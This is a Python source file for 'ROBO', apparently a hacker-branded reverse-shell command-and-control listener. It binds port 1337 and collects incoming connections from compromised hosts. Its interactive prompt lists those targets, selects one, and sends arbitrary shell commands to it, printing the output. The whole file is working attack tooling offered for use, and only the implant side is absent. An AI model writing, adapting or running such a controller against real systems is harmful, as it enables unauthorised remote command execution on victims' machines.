from colorama import Fore,Style
import os
import socket
import sys
import threading
import time
from queue import Queue

banner = Fore.MAGENTA + Style.BRIGHT + '''

______   _____  ______   _____ 
| ___ \ |  _  | | ___ \ |  _  |
| |_/ / | | | | | |_/ / | | | |
|    /  | | | | | ___ \ | | | |
| |\ \  \ \_/ / | |_/ / \ \_/ /
\_| \_|  \___/  \____/   \___/ 
                               
Author    : king
Instagram : the.empiresec
GitHub    : theEmpireSec
Blog      : www.empiresec.blogspot.com
''' + Fore.RESET
print(banner)

THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()

all_connections = []
all_address = []


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 1337
        s = socket.socket()
    except socket.error as msg:
        print(Fore.RED + Style.BRIGHT + "[!] Socket creaton error ! \n[!] Below is the error occured :\n")
        print(str(msg))

def bind_socket():
    try:
        global host
        global port
        global s

        print(Fore.CYAN + Style.BRIGHT + "[+] Binding ===> " + str(port))
        s.bind((host,port))
        print(Fore.GREEN + Style.BRIGHT + "[+] Listening for connections : ")
        s.listen(10)



    except socket.error as msg:
        print(Fore.RED + Style.BRIGHT + "[!] Socket Binding Error !\n[!] Below is the error occured :\n")
        print(str(msg))
        retry = input(Fore.GREEN + Style.BRIGHT + "[+] Wanna retry (y/n) : ")
        if retry == 'y':
            print(Fore.GREEN + Style.BRIGHT + "[+] Retrying..........")
            bind_socket()
        else:
            sys.exit(0)



def accept_connection():
    for c in all_connections:
        c.close()
    del all_address[:]
    del all_connections[:]

    while True:
        try:
            conn,address = s.accept()
            s.setblocking(1)
            all_connections.append(conn)
            all_address.append(address)
            print(Fore.GREEN + Style.BRIGHT + f"[+] Connected ===> {address[0]} | {address[1]}")


        except:
            print(Fore.RED + Style.BRIGHT + "[!] Error Accepting connections !!!")


def start_robo():
    while True:
        cmd = input(Fore.MAGENTA + Style.BRIGHT + "robo> " + Fore.RESET)
        if cmd == "list" or cmd == "ls":
            list_connections()
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("[!] Command not found !")


def list_connections():
    results = ""

    
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results = str(i) + "    " +str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"

    print(Fore.CYAN + Style.BRIGHT + "----------targets----------" + "\n" + results + Fore.RESET)





def get_target(cmd):
    try:
        target = cmd.replace("select ","")
        target = int(target)
        conn = all_connections[target]
        print(Fore.GREEN + Style.BRIGHT + "[+] Connected to " + str(all_address[target][0]) + Fore.RESET)
        print(str(all_address[target][0]) + "> ",end="")
        return conn

    except:
        print(Fore.RED + Style.BRIGHT + "[!] Invalid selection ")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == "q":
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                response = str(conn.recv(20480),"utf-8")
                print(response,end="")
        except:
            print(Fore.RED + Style.BRIGHT + "[!] Error sending commands")
            break

def create_worker():
    for _ in range(THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():
        while True:
            x = queue.get()
            if x == 1:
                create_socket()
                bind_socket()
                accept_connection()
            if x == 2:
                start_robo()
                    
            queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()




create_worker()
create_jobs()






























